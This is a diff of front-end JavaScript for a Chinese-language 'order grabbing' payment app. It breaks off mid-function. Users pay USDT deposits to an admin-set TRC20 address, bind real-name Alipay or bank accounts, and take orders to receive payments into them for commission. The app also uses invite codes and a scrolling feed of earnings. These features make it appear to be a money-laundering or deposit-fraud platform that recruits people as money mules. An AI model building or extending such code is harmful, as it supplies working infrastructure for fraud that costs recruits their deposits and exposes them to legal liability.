+    state.config = Object.assign(state.config, configRes.config || {});
+    state.user = meRes.user;
+    state.orders = ordersRes.orders || [];
+    state.refunds = refundsRes.refunds || [];
+    render(); startPolling();
+  } catch (e) {
+    reportError('bootstrap', e);
+    clearToken(); state.user = null; render();
+  }
+}
+
+/* ================= Render（含焦点/输入保护） ================= */
+function findByIdIn(root, id) { return Array.from(root.querySelectorAll('[id]')).find(e => e.id === id); }
+function render() {
+  const app = $('#app');
+  const snap = {};
+  app.querySelectorAll('input[id],textarea[id],select[id]').forEach(el => snap[el.id] = el.value);
+  const active = document.activeElement;
+  const activeId = active && app.contains(active) ? active.id : null;
+  const selStart = active && 'selectionStart' in active ? active.selectionStart : null;
+
+  if (!state.user) app.innerHTML = renderAuth();
+  else app.innerHTML = renderMainApp();
+
+  Object.keys(snap).forEach(id => {
+    const el = findByIdIn(app, id);
+    if (el && el.value !== snap[id]) el.value = snap[id];
+  });
+  if (activeId) {
+    const el = findByIdIn(app, activeId);
+    if (el) {
+      try { el.focus(); if (selStart != null) el.setSelectionRange(selStart, selStart); } catch (e) {}
+    }
+  }
+}
+
+function renderAuth() {
+  const isLogin = state.authTab === 'login';
+  return `
+  <div class="auth-wrap">
+    <div class="auth-card">
+      ${state.config.loginLogoUrl
+        ? `<div class="auth-logo" style="overflow:hidden; padding:0; background:none;"><img src="${esc(state.config.loginLogoUrl)}" style="width:100%; height:100%; object-fit:cover;" alt="Logo"></div>`
+        : `<div class="auth-logo">单</div>`}
+      <h1>亿万富豪集团支付</h1>
+      <p class="auth-sub">部门 · 承兑</p>
+      <div class="auth-tabs">
+        <button class="auth-tab${isLogin ? ' active' : ''}" data-action="auth-tab" data-tab="login">登录</button>
+        <button class="auth-tab${!isLogin ? ' active' : ''}" data-action="auth-tab" data-tab="register">注册</button>
+      </div>
+      ${isLogin ? `
+        <label class="field"><span class="field-label">用户名</span><input class="input" id="login-username" maxlength="20" placeholder="请输入用户名"></label>
+        <label class="field"><span class="field-label">密码</span><input class="input" id="login-password" type="password" maxlength="30" placeholder="请输入密码"></label>
+        <button class="btn btn-primary btn-block" data-action="do-login" style="margin-top:6px">登 录</button>
+      ` : `
+        <label class="field"><span class="field-label">用户名 <i>*</i></span><input class="input" id="reg-username" maxlength="20" placeholder="3-20 位字母或数字"></label>
+        <label class="field"><span class="field-label">密码 <i>*</i></span><input class="input" id="reg-password" type="password" maxlength="30" placeholder="至少 6 位"></label>
+        <label class="field"><span class="field-label">确认密码 <i>*</i></span><input class="input" id="reg-password2" type="password" maxlength="30" placeholder="再次输入密码"></label>
+        <label class="field"><span class="field-label">邀请码 <i>*</i></span><input class="input" id="reg-invite" maxlength="20" placeholder="请输入邀请码"></label>
+        <button class="btn btn-primary btn-block" data-action="do-register" style="margin-top:6px">注 册</button>
+      `}
+    </div>
+  </div>`;
+}
+
+function renderMainApp() {
+  const u = state.user;
+  const name = u.username || '我';
+  const initial = name.slice(0, 1);
+  const viewHtml = ({ hall: viewHall, mine: viewMine, deposit: viewDeposit, refund: viewRefund }[state.view] || viewHall)();
+  const bindBanner = !hasPayMethod(u) ? `
+    <div data-action="open-paymethod" style="display:flex;align-items:center;justify-content:space-between;gap:10px;background:#fff4ec;border:1px solid #ffe0b2;border-radius:12px;padding:12px 14px;margin-bottom:14px;cursor:pointer;">
+      <div style="font-size:13px;color:#c2410c;font-weight:600;line-height:1.5">⚠️ 你还没绑定收款方式<br><span style="font-size:12px;color:#9a3412;opacity:.8">绑定后才能抢单并收款</span></div>
+      <div style="font-size:12.5px;font-weight:800;color:#fff;background:#f0a020;padding:7px 14px;border-radius:8px;white-space:nowrap">立即绑定</div>
+    </div>` : '';
+
+  return `
+  <div class="app">
+    <aside class="sidebar">
+      <div class="brand"><div class="brand-logo">单</div><div><div class="brand-name">众包接单</div><div class="brand-sub">订单大厅</div></div></div>
+      <nav class="nav">
+        <button class="nav-item${state.view === 'hall' ? ' active' : ''}" data-action="nav" data-view="hall"><span class="ico">📋</span>订单大厅</button>
+        <button class="nav-item${state.view === 'mine' ? ' active' : ''}" data-action="nav" data-view="mine"><span class="ico">📥</span>我的接单</button>
+        <button class="nav-item${state.view === 'deposit' ? ' active' : ''}" data-action="nav" data-view="deposit"><span class="ico">💰</span>充值押金</button>
+        <button class="nav-item${state.view === 'refund' ? ' active' : ''}" data-action="nav" data-view="refund"><span class="ico">💸</span>押金退款</button>
+      </nav>
+      <div class="sidebar-foot">
+        <button class="user-box" data-action="open-profile"><div class="avatar">${esc(initial)}</div><div><div class="user-name">${esc(name)}</div><div class="user-sub">押金 ${esc(u.deposit)} USDT</div></div></button>
+        <button class="logout-btn" data-action="logout">退出登录</button>
+      </div>
+    </aside>
+    <main class="main">
+      <header class="mhead"><div class="brand"><div class="brand-logo">单</div><div class="brand-name">订单大厅</div></div><button class="avatar" data-action="open-profile">${esc(initial)}</button></header>
+      ${bindBanner}
+      <div id="view">${viewHtml}</div>
+    </main>
+    <nav class="tabbar">
+      <button class="nav-item${state.view === 'hall' ? ' active' : ''}" data-action="nav" data-view="hall"><span class="ico">📋</span>大厅</button>
+      <button class="nav-item${state.view === 'mine' ? ' active' : ''}" data-action="nav" data-view="mine"><span class="ico">📥</span>接单</button>
+      <button class="nav-item${state.view === 'deposit' ? ' active' : ''}" data-action="nav" data-view="deposit"><span class="ico">💰</span>充值</button>
+      <button class="nav-item${state.view === 'refund' ? ' active' : ''}" data-action="nav" data-view="refund"><span class="ico">💸</span>退款</button>
+    </nav>
+  </div>`;
+}
+
+/* ============ ⬇️⬇️⬇️ 第一段到此结束，请继续复制第二段 ⬇️⬇️⬇️ ============ */
+ /* ================= 视图 ================= */
+const STATUS_MAP = {
+  pending: { text: '待审核', cls: 'status-pending' },
+  confirm: { text: '待收款', cls: 'status-confirm' },
+  paid:    { text: '已收款', cls: 'status-paid' },
+  paused:  { text: '暂停中', cls: 'status-paused' },
+  cancelled: { text: '已取消', cls: 'status-cancel' }
+};
+const statusOf = s => STATUS_MAP[s] || STATUS_MAP.pending;
+
+function viewHall() {
+  const cancelTabName = state.config.tabCancelName || '集团介绍';
+  const tabs = [
+    { id: 'cancelled', name: cancelTabName },
+    { id: 'hall', name: '订单大厅' },
+    { id: 'confirm', name: '待收款' },
+    { id: 'paid', name: '已收款' }
+  ];
+
+  if (state.orderTab === 'cancelled') {
+    const hasVideo  = state.config.videoUrl && state.config.videoUrl.trim();
+    const aboutTitle = state.config.aboutTitle || '企业简介';
+    const hasAbout  = state.config.aboutText && state.config.aboutText.trim();
+    const featureList = state.config.featureList || [];
+    const linkTitle = state.config.linkCardTitle && state.config.linkCardTitle.trim();
+    const linkList  = state.config.linkList || [];
+    const hasLinks  = linkTitle && linkList.length > 0;
+    return `
+    <div class="page">
+      <div class="order-tabs">${tabs.map(t => `<button class="order-tab${state.orderTab === t.id ? ' active' : ''}" data-action="order-tab" data-tab="${t.id}">${esc(t.name)}</button>`).join('')}</div>
+      <div class="empty-rich">
+        ${hasVideo ? `<div class="media-box"><video src="${esc(state.config.videoUrl)}" controls preload="metadata" playsinline></video></div>` : ''}
+        ${hasAbout ? `<div class="about-title">🏢 ${esc(aboutTitle)}</div><div class="about-text">${esc(state.config.aboutText)}</div>` : ''}
+        ${hasLinks ? `<div class="link-card" data-action="open-link-menu"><div class="lc-left"><span class="lc-icon">🔗</span><span>${esc(linkTitle)}</span></div><span class="lc-arrow">›</span></div>` : ''}
+        ${featureList.length > 0 ? featureList.map((item, idx) => {
+          const isOpen = !!state.featureOpen[idx];
+          return `<div class="feature-box"><div class="feature-header" data-action="toggle-feature" data-idx="${idx}"><span>📖 ${esc(item.title || '功能说明')}</span><span class="arrow" style="transform:rotate(${isOpen ? 180 : 0}deg)">▼</span></div><div class="feature-content" style="display:${isOpen ? 'block' : 'none'}">${esc(item.content || '')}</div></div>`;
+        }).join('') : ''}
+        ${!hasVideo && !hasAbout && featureList.length === 0 && !hasLinks ? `<div style="text-align:center;padding:40px 20px;color:var(--ink3);font-size:13px">暂无简介内容，管理员可在后台配置</div>` : ''}
+        <div style="margin-top:20px; text-align:center;"><button class="btn btn-primary" data-action="open-empty-modal" style="width:100%; border-radius:12px; background:#f0a020; color:#fff; font-weight:800; padding:15px; font-size:16px; box-shadow:0 4px 12px rgba(240,160,32,0.3);">⚡ 内部空放通道</button></div>
+      </div>
+    </div>`;
+  }
+
+  let list = state.orders.slice();
+  let emptyText = '该分类下还没有订单';
+  if (state.orderTab === 'hall') {
+    list = list.filter(o => o.status === 'pending'); emptyText = '大厅里暂时没有可接订单';
+  } else if (state.orderTab === 'confirm') {
+    list = list.filter(o => o.status === 'confirm' && (o.takers || []).some(t => t.userId === state.user?.id && t.status === 'working'));
+    emptyText = '你还没有待收款的订单';
+  } else if (state.orderTab === 'paid') {
+    list = list.filter(o => o.status === 'paid' && (o.takers || []).some(t => t.userId === state.user?.id && t.status === 'done'));
+    emptyText = '你还没有已收款的订单';
+  } else {
+    list = list.filter(o => o.status === state.orderTab);
+  }
+  list.sort((a, b) => b.createdAt - a.createdAt);
+
+  const marqueeOrders = state.orders.filter(o => o.status === 'paid').sort((a, b) => b.createdAt - a.createdAt).slice(0, 15);
+  let marqueeHtml = '';
+  if (marqueeOrders.length > 0) {
+    const itemsHtml = marqueeOrders.map(o => {
+      const taker = (o.takers || []).find(t => t.status === 'done') || (o.takers || [])[0] || {};
+      const name = taker.userName || '用户**';
+      const initial = name.slice(0, 1);
+      return `<div class="marquee-item"><div class="m-avatar">${esc(initial)}</div><span class="m-name">${esc(name)}</span><span class="m-text">成功完成订单，收款</span><span class="m-amount">¥${Number(o.amount).toFixed(0)}</span><span class="m-text">，获得返佣</span><span class="m-amount">¥${Number(o.commission).toFixed(0)}</span><span class="m-time">· ${timeAgo(o.createdAt)}</span></div>`;
+    }).join('');
+    marqueeHtml = `<div class="marquee-box"><div class="marquee-label"><span class="dot"></span>最新完成订单</div><div class="marquee-viewport"><div class="marquee-track">${itemsHtml}${itemsHtml}</div></div></div>`;
+  }
+
+  return `
+  <div class="page">
+    <div class="order-tabs">${tabs.map(t => `<button class="order-tab${state.orderTab === t.id ? ' active' : ''}" data-action="order-tab" data-tab="${t.id}">${esc(t.name)}</button>`).join('')}</div>
+    ${marqueeHtml}
+    <div class="order-list">${list.length ? list.map(orderCard).join('') : `<div class="empty"><div class="empty-ico">📭</div><h3>暂无订单</h3><p>${emptyText}</p></div>`}</div>
+  </div>`;
+}
+
+function orderCard(o) {
+  const st = statusOf(o.status);
+  const took = !!myTaker(o);
+  const canGrab = o.status === 'pending' && !took;
+  const required = depositRequired(o);
+  const enough = hasEnoughDeposit(o);
+  let btnText = '抢单', btnClass = 'order-btn', btnAction = 'grab';
+  if (took) { btnText = '已接单'; btnClass += ' done'; btnAction = ''; }
+  else if (o.status !== 'pending') { btnText = st.text; btnClass += ' done'; btnAction = ''; }
+  else if (!enough) { btnText = `需押金 ${required} USDT · 去充值`; btnClass = 'order-btn need-deposit'; btnAction = 'deposit'; }
+  const btnAttr = btnAction ? `data-action="${btnAction}" data-id="${o.id}"` : 'disabled';
+  const depositTip = (canGrab && !enough) ? `<div class="deposit-tip">🔒 当前押金 ${esc(state.user.deposit)} USDT，抢此单需 ${required} USDT</div>` : '';
+  return `<div class="order-card" data-action="open" data-id="${o.id}">
+    <div class="order-header"><div class="order-no">订单号：${esc(o.orderNo)}</div><div class="order-status ${st.cls}">${st.text}</div></div>
+    <div class="order-amounts">
+      <div class="amount-item"><span class="amount-label">收款金额：</span><span class="amount-value red">${Number(o.amount).toFixed(2)}</span></div>
+      <div class="amount-item"><span class="amount-label">返佣金额：</span><span class="amount-value gold">${Number(o.commission).toFixed(2)}</span></div>
+    </div>
+    ${depositTip}
+    <div class="order-info">
+      <div class="order-info-row"><span class="label">创建时间：</span><span class="val">${fmtDateTime(o.createdAt)}</span></div>
+      <div class="order-info-row"><span class="label">收款类型：</span><span class="val">${esc(o.payType)}</span></div>
+    </div>
+    <button class="${btnClass}" ${btnAttr}>${esc(btnText)}</button>
+  </div>`;
+}
+
+function viewMine() {
+  const all = state.orders.filter(o => myTaker(o));
+  const working = all.filter(o => myTaker(o).status === 'working');
+  const done = all.filter(o => myTaker(o).status === 'done');
+  const list = (state.mineTab === 'done' ? done : working);
+  const listHtml = list.length
+    ? `<div class="order-list">${list.map(mineOrderCard).join('')}</div>`
+    : `<div class="empty"><div class="empty-ico">📥</div><h3>暂无记录</h3><p>${state.mineTab === 'working' ? '去订单大厅抢一单试试' : '完成的订单会显示在这里'}</p></div>`;
+  return `<div class="page">
+    <div class="order-tabs">
+      <button class="order-tab${state.mineTab === 'working' ? ' active' : ''}" data-action="mine-tab" data-tab="working">进行中 ${working.length}</button>
+      <button class="order-tab${state.mineTab === 'done' ? ' active' : ''}" data-action="mine-tab" data-tab="done">已完成 ${done.length}</button>
+    </div>
+    ${listHtml}
+  </div>`;
+}
+
+function mineOrderCard(o) {
+  const tk = myTaker(o);
+  const isDone = tk.status === 'done';
+  return `<div class="order-card" data-action="open" data-id="${o.id}">
+    <div class="order-header"><div class="order-no">订单号：${esc(o.orderNo)}</div><div class="order-status ${isDone ? 'status-paid' : 'status-confirm'}">${isDone ? '已完成' : '进行中'}</div></div>
+    <div class="order-amounts">
+      <div class="amount-item"><span class="amount-label">收款金额：</span><span class="amount-value red">${Number(o.amount).toFixed(2)}</span></div>
+      <div class="amount-item"><span class="amount-label">返佣金额：</span><span class="amount-value gold">${Number(o.commission).toFixed(2)}</span></div>
+    </div>
+    <div class="order-info">
+      <div class="order-info-row"><span class="label">收款类型：</span><span class="val">${esc(o.payType)}</span></div>
+      <div class="order-info-row"><span class="label">接单时间：</span><span class="val">${timeAgo(tk.at)}</span></div>
+    </div>
+    ${isDone
+      ? `<button class="order-btn done" disabled>已完成</button>`
+      : `<button class="order-btn" data-action="submit-work" data-id="${o.id}">提交完成</button>`}
+  </div>`;
+}
+
+function imTokenIconHtml() {
+  const url = state.config.walletIconUrl;
+  if (url && String(url).trim()) {
+    return `<img src="${esc(url)}" alt="imToken" onerror="this.onerror=null;this.style.display='none';this.parentNode.innerHTML='<svg width=22 height=22 viewBox=&quot;0 0 24 24&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;><path fill=&quot;#fff&quot; d=&quot;M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z&quot;/></svg>'">`;
+  }
+  return `<svg width="22" height="22" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z"/></svg>`;
+}
+
+/* P2-1：充值表单抽取公共渲染 */
+function depositFormHtml(opts = {}) {
+  const order   = opts.order || null;
+  const compact = !!opts.compact;
+  const addr = state.config.trc20 || '';
+  const min  = Number(state.config.minDeposit) || 10;
+  const qrSize = compact ? 140 : 160;
+  const required = order ? depositRequired(order) : 0;
+  return `
+    ${order ? `<div class="notice" style="margin-bottom:14px">🔒 抢此单需押金 ${required} USDT，当前押金 ${esc(state.user.deposit)} USDT</div>` : ''}
+    <div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:${compact ? 14 : 16}px;margin-bottom:16px">
+      <div style="font-size:12.5px;color:var(--ink3)">当前押金余额</div>
+      <div style="font-size:${compact ? 22 : 24}px;font-weight:800;color:var(--brand);margin-top:2px">${esc(state.user.deposit)} <span style="font-size:13px">USDT</span></div>
+    </div>
+    <div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:10px">选择钱包</div>
+    <div class="wallet-choices" style="grid-template-columns:1fr">
+      <button class="wallet-card active" data-action="pick-wallet" data-wallet="imtoken">
+        <div class="wc-icon imtoken">${imTokenIconHtml()}</div>
+        <div class="wc-info"><div class="wc-name">imToken</div><div class="wc-tip">官方认证 · 推荐使用</div></div>
+        <div class="wc-check">✓</div>
+      </button>
+    </div>
+    <div style="background:#f8f9fd;border:1px dashed var(--line);border-radius:12px;padding:16px;margin-bottom:16px;text-align:center;">
+      <div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:12px">扫码转账 (仅限 TRC20)</div>
+      <div style="display:inline-block;padding:8px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.05);margin-bottom:12px;">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=${qrSize}x${qrSize}&data=${esc(addr)}" width="${qrSize}" height="${qrSize}" alt="收款二维码" style="display:block;">
+      </div>
+      <div style="font-size:12px;color:var(--ink3);margin-bottom:6px;">收款地址</div>
+      <div style="display:flex;align-items:center;gap:8px;justify-content:center;max-width:100%;">
+        <span style="font-size:12px;word-break:break-all;color:var(--ink);text-align:left;flex:1;">${esc(addr)}</span>
+        <button class="btn btn-ghost" data-action="copy-addr" style="padding:6px 12px;font-size:12px;border-color:var(--line);flex:0 0 auto;">复制</button>
+      </div>
+    </div>
+    <label class="field" style="margin-bottom:12px">
+      <span class="field-label">${compact ? '充值' : '支付'}金额（USDT）</span>
+      <input class="input" id="deposit-amount" type="number" min="${min}" step="1" value="100">
+    </label>
+    <button class="btn btn-imtoken btn-block" data-action="pay-imtoken" style="margin-bottom:12px">🦊 一键支付 · 打开 imToken</button>
+    ${compact ? '<div class="notice">⚠️ 点击"我已完成支付"后，系统将自动查询链上到账记录。</div>' : ''}
+    <div style="text-align:center;font-size:12px;color:var(--ink3);margin-top:14px">${esc(state.config.support)}</div>
+  `;
+}
+
+function viewDeposit() {
+  return `<div class="page"><div class="form-card">
+    <h2 style="font-size:18px;font-weight:800;margin-bottom:6px;">充值押金</h2>
+    <p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">使用 USDT (TRC20) 充值，抢单前需缴纳押金</p>
+    ${depositFormHtml({ compact: false })}
+    <button class="btn btn-primary btn-block" data-action="manual-confirm-deposit" style="margin-top:10px">我已完成支付</button>
+  </div></div>`;
+}
+
+function viewRefund() {
+  const u = state.user;
+  const myRefunds = state.refunds.slice().sort((a, b) => b.createdAt - a.createdAt);
+  const recordsHtml = myRefunds.length ? `<div class="form-card" style="margin-top:16px;max-width:680px"><h3 style="font-size:15px;font-weight:800;margin-bottom:14px">我的退款记录</h3>${myRefunds.map(r => `<div style="border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin-bottom:10px">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+      <span style="font-size:14px;font-weight:800;color:var(--brand)">${esc(r.amount)} USDT</span>
+      <span class="order-status ${r.status === 'pending' ? 'status-pending' : r.status === 'approved' ? 'status-paid' : 'status-cancel'}">${r.status === 'pending' ? '待审核' : r.status === 'approved' ? '已打款' : '已拒绝'}</span>
+    </div>
+    <div style="font-size:12px;color:var(--ink3);word-break:break-all;margin-bottom:4px">地址：${esc(r.address)}</div>
+    <div style="font-size:12px;color:var(--ink3)">提交时间：${fmtDateTime(r.createdAt)}</div>
+  </div>`).join('')}</div>` : '';
+  return `<div class="page">
+    <div class="form-card">
+      <h2 style="font-size:18px;font-weight:800;margin-bottom:6px;">押金退款</h2>
+      <p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">申请退还押金，审核通过后将退回至您的钱包</p>
+      <div style="background:#f8f9fd;border:1px solid #e8eaf1;border-radius:12px;padding:16px;margin-bottom:18px">
+        <div style="font-size:12.5px;color:var(--ink3)">当前可退押金</div>
+        <div style="font-size:24px;font-weight:800;color:var(--ink);margin-top:2px">${esc(u.deposit)} <span style="font-size:13px">USDT</span></div>
+      </div>
+      <label class="field"><span class="field-label">退款金额（USDT）<i>*</i></span><input class="input" id="refund-amount" type="number" min="1" step="1" max="${esc(u.deposit)}" placeholder="例如：100"></label>
+      <label class="field"><span class="field-label">接收退款的 TRC20 地址 <i>*</i></span><input class="input" id="refund-address" placeholder="请输入您的 TRC20 钱包地址"></label>
+      <div class="notice" style="margin-bottom:14px">⚠️ 请确保地址正确，错误后果自负！并且不能找回！申请后系统自动处理到钱包地址</div>
+      <button class="btn btn-primary btn-block" data-action="submit-refund">提交退款申请</button>
+    </div>
+    ${recordsHtml}
+  </div>`;
+}
+
+/* ================= Modal 基础 ================= */
+function openModal(html) { $('#modal-root').innerHTML = `<div class="overlay"><div class="modal">${html}</div></div>`; document.body.style.overflow = 'hidden'; }
+function closeModal() { $('#modal-root').innerHTML = ''; document.body.style.overflow = ''; }
+
+function openLinkMenu() {
+  const rawList = state.config.linkList || [];
+  const list = [];
+  const seen = new Set();
+  for (const item of rawList) {
+    const key = `${item.title}|${item.url}`;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    if (!isSafeHttpUrl(item.url)) continue;
+    list.push(item);
+  }
+  if (!list.length) { toast('暂无可跳转的链接'); return; }
+  const title = state.config.linkCardTitle || '更多服务';
+  const buttonsHtml = list.map(item => `<a class="link-menu-btn" href="${esc(item.url)}" target="_blank" rel="noopener noreferrer"><span class="lm-left"><span class="lm-icon">🌐</span><span>${esc(item.title)}</span></span><span class="lm-arrow">›</span></a>`).join('');
+  openModal(`<div class="modal-head"><h2>${esc(title)}</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body">${buttonsHtml}</div>`);
+}
+
+function openPayMethodModal(isForce = false) {
+  state.temp.pmForce = !!isForce;
+  const canClose = !isForce;
+  const pm = state.user?.payMethod || {};
+  let alipay = { realName: '', account: '' };
+  let bank = { realName: '', account: '', bank: '' };
+  if (pm.type === 'alipay') {
+    alipay = { realName: pm.realName || '', account: pm.account || '' };
+  } else if (pm.type === 'bank') {
+    bank = { realName: pm.realName || '', account: pm.account || '', bank: pm.bank || '' };
+  } else {
+    if (pm.alipay) alipay = { realName: pm.alipay.realName || '', account: pm.alipay.account || '' };
+    if (pm.bank)   bank   = { realName: pm.bank.realName || '', account: pm.bank.account || '', bank: pm.bank.bank || '' };
+  }
+  openModal(`<div class="modal-head"><h2>${isForce ? '请先绑定收款方式' : '绑定收款方式'}</h2>${canClose ? `<button class="icon-btn" data-action="close-modal">✕</button>` : ''}</div>
+    <div class="modal-body">
+      <div class="notice" style="margin-bottom:16px">${isForce ? '⚠️ 抢单前至少绑定一种收款方式' : '⚠️ 至少填写一种，可同时绑定支付宝与银行卡'}</div>
+      <div style="border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:14px;background:#f8faff">
+        <div style="font-size:13.5px;font-weight:800;color:#2563eb;margin-bottom:12px">💙 支付宝（选填）</div>
+        <label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">收款姓名</span><input class="input" id="pm-alipay-name" maxlength="20" placeholder="与支付宝实名一致" value="${esc(alipay.realName)}"></label>
+        <label class="field" style="margin-bottom:0"><span class="field-label" style="font-size:12.5px">支付宝账号</span><input class="input" id="pm-alipay-account" maxlength="40" placeholder="手机号或邮箱" value="${esc(alipay.account)}"></label>
+      </div>
+      <div style="border:1px solid var(--line);border-radius:12px;padding:14px;background:#fffdf8">
+        <div style="font-size:13.5px;font-weight:800;color:#b45309;margin-bottom:12px">🏦 银行卡（选填）</div>
+        <label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">收款姓名</span><input class="input" id="pm-bank-name" maxlength="20" placeholder="与银行卡开户名一致" value="${esc(bank.realName)}"></label>
+        <label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">银行卡号</span><input class="input" id="pm-bank-account" maxlength="30" placeholder="不空格、不横线" value="${esc(bank.account)}"></label>
+        <label class="field" style="margin-bottom:0"><span class="field-label" style="font-size:12.5px">开户银行</span><input class="input" id="pm-bank-bank" maxlength="30" placeholder="例如：中国工商银行" value="${esc(bank.bank)}"></label>
+      </div>
+      <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:12px 14px;margin-top:14px">
+        <div style="font-size:12px;color:#16a34a;line-height:1.7">✅ 至少填写支付宝或银行卡其中一项<br><span style="opacity:.85">填的越多，抢单时可选的收款方式越多</span></div>
+      </div>
+    </div>
+    <div class="modal-foot">
+      ${canClose ? `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">稍后再说</button>` : ''}
+      <button class="btn btn-primary" data-action="save-paymethod">确认保存</button>
+    </div>`);
+}
+
+function openProfile() {
+  const u = state.user;
+  const pms = getPayMethods(u);
+  const pmHtml = pms.length
+    ? pms.map(p => `<div style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1px solid var(--line);border-radius:8px;margin-top:8px">
+        <span class="pm-btn-blue">${p.type === 'alipay' ? '支付宝' : '银行卡'}</span>
+        <div style="flex:1;min-width:0">
+          <div style="font-size:13px;font-weight:700">${esc(p.realName || '')}</div>
+          <div style="font-size:11.5px;color:var(--ink3);word-break:break-all">${esc(p.account || '')}${p.bank ? ' · ' + esc(p.bank) : ''}</div>
+        </div>
+      </div>`).join('')
+    : `<div style="margin-top:8px;font-size:13px;color:var(--ink3)">未绑定</div>`;
+  openModal(`<div class="modal-head"><h2>个人资料</h2><button class="icon-btn" data-action="close-modal">✕</button></div>
+    <div class="modal-body">
+      <div class="detail-grid" style="margin:0 0 14px">
+        <div class="dg-item"><div class="dg-k">用户名</div><div class="dg-v">${esc(u.username)}</div></div>
+        <div class="dg-item"><div class="dg-k">信用分</div><div class="dg-v">${esc(u.credit)}</div></div>
+        <div class="dg-item"><div class="dg-k">累计收入</div><div class="dg-v">¥${esc(u.income)}</div></div>
+        <div class="dg-item"><div class="dg-k">押金余额</div><div class="dg-v" style="color:var(--brand)">${esc(u.deposit)} USDT</div></div>
+      </div>
+      <div style="margin-top:12px;padding:12px 14px;background:#fff9ec;border:1px dashed #ffe0b2;border-radius:10px">
+        <div style="font-size:12px;color:#c27800;margin-bottom:4px">🎁 我的邀请码</div>
+        <div style="font-size:18px;font-weight:800;color:var(--brand);letter-spacing:2px">${esc(u.inviteCode || '生成中')}</div>
+        <div style="font-size:11.5px;color:var(--ink3);margin-top:4px">分享给你的朋友，让他们注册时填写</div>
+      </div>
+      <div style="margin-top:12px;padding:12px 14px;background:#f8f9fd;border-radius:10px">
+        <div style="font-size:12px;color:var(--ink3);margin-bottom:4px">已绑定的收款方式</div>
+        ${pmHtml}
+      </div>
+      <button class="btn btn-ghost btn-block" data-action="open-paymethod" style="margin-top:12px;background:#fff;border-color:var(--line)">${pms.length ? '修改收款方式' : '绑定收款方式'}</button>
+      <button class="btn btn-block" data-action="logout" style="margin-top:10px;background:#fff4ec;border:1px solid #ffe0b2;color:#c2410c;font-weight:700">🚪 退出登录 / 切换账号</button>
+    </div>
+    <div class="modal-foot"><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button></div>`);
+}
+
+function openGrabModal(id) {
+  const o = state.orders.find(x => x.id === id);
+  if (!o) return;
+  if (o.status !== 'pending' || myTaker(o)) { toast('这个订单已经不能抢了'); return; }
+  if (!hasPayMethod(state.user)) { state.temp.pendingGrabId = id; openPayMethodModal(true); return; }
+  if (!hasEnoughDeposit(o)) { toast(`押金不足，需 ${depositRequired(o)} USDT`); return; }
+
+  const pms = getPayMethods(state.user);
+  state.grabChoice = pms.length === 1 ? pms[0].type : (state.grabChoice || pms[0].type);
+  const choiceHtml = pms.length === 1
+    ? `<div style="padding:12px 14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;margin-bottom:14px">
+        <div style="font-size:12px;color:#16a34a;margin-bottom:4px">将使用以下收款方式</div>
+        <div style="font-size:13.5px;font-weight:700;color:#166534">${esc(formatPayMethod(pms[0]))}</div>
+        <div style="font-size:12px;color:#16a34a;margin-top:4px">收款姓名：${esc(pms[0].realName)}</div>
+      </div>`
+    : `<div style="margin-bottom:14px">
+        <div style="font-size:13px;font-weight:800;color:var(--ink2);margin-bottom:8px">选择收款方式</div>
+        <div class="pm-choice">${pms.map(p => `<label class="pm-choice-item${state.grabChoice === p.type ? ' active' : ''}" data-action="pick-pm" data-type="${p.type}">
+          <input type="radio" name="grab-pm" value="${p.type}" ${state.grabChoice === p.type ? 'checked' : ''}>
+          <div class="pm-choice-info">
+            <div class="t">${p.type === 'alipay' ? '💙 支付宝' : '🏦 银行卡'}</div>
+            <div class="s">${esc(p.account)}${p.bank ? ' · ' + esc(p.bank) : ''} · ${esc(p.realName)}</div>
+          </div>
+        </label>`).join('')}</div>
+      </div>`;
+  openModal(`<div class="modal-head"><h2>确认抢单</h2><button class="icon-btn" data-action="close-modal">✕</button></div>
+    <div class="modal-body">
+      <div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:16px;text-align:center;margin-bottom:16px">
+        <div style="font-size:12px;color:var(--ink3);margin-bottom:6px">订单号：${esc(o.orderNo)}</div>
+        <div style="font-size:28px;font-weight:850;color:var(--red);letter-spacing:-1px">${Number(o.amount).toFixed(2)}</div>
+        <div style="font-size:13px;color:var(--brand);font-weight:700;margin-top:4px">返佣 ${Number(o.commission).toFixed(2)}</div>
+      </div>
